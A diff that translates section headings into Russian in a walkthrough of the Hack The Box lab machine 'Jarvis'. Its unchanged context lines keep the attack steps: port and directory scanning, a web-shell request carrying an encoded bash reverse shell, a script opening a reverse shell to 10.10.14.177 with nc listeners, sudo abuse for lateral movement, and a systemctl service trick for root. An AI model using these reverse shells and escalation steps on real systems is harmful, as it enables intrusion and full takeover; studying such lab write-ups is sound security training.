@@ -59,7 +59,7 @@ Apache 2.4.25 (Debian) на порту 80 с сайтом "Stark Hotel" и до�
 
 ## Разведка
 
-### Port Scan
+### Сканирование Портов
 
 ```bash
 nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n jarvis.htb -oA scans/quick
@@ -74,7 +74,7 @@ nmap -sC -sV -Pn -n --open -p 22,80,64999 jarvis.htb -oA scans/detail
 
 Порт 64999 защищён fail2ban - при частых запросах блокирует IP на 90 секунд. **Не трогаем его**, чтобы не потерять доступ.
 
-### Directory Enumeration
+### Перечисление Директорий
 
 ```bash
 gobuster dir -u http://jarvis.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
@@ -241,7 +241,7 @@ curl -s "http://jarvis.htb/x.php?x=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC
 
 **Важно:** в URL `+` нужно кодировать как `%2B`, иначе сервер примет его за пробел и base64 сломается.
 
-### Stabilize
+### Стабилизация
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -254,7 +254,7 @@ export TERM=xterm
 
 ## Боковое Перемещение (www-data → pepper)
 
-### Enumeration
+### Перечисление
 
 ```bash
 sudo -l
@@ -295,13 +295,13 @@ cat /tmp/shell.sh
 # bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
 ```
 
-### Listener
+### Слушатель
 
 ```bash
 nc -lvnp 4445
 ```
 
-### Exploit
+### Эксплуатация
 
 ```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -310,7 +310,7 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 
 **Shell от `pepper`.**
 
-### Stabilize
+### Стабилизация
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -319,7 +319,7 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-### User flag
+### Флаг Пользователя
 
 ```bash
 cat /home/pepper/user.txt
@@ -333,7 +333,7 @@ cat /home/pepper/user.txt
 
 ## Повышение Привилегий (pepper → root)
 
-### Enumeration
+### Перечисление
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null | grep systemctl
@@ -364,13 +364,13 @@ WantedBy=multi-user.target
 EOF
 ```
 
-### Listener (второй терминал)
+### Слушатель (второй терминал)
 
 ```bash
 nc -lvnp 4445
 ```
 
-### Exploit
+### Эксплуатация
 
 ```bash
 /bin/systemctl link /home/pepper/root.service
@@ -388,7 +388,7 @@ root@jarvis:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Root flag
+### Root Флаг
 
 ```bash
 cd /root
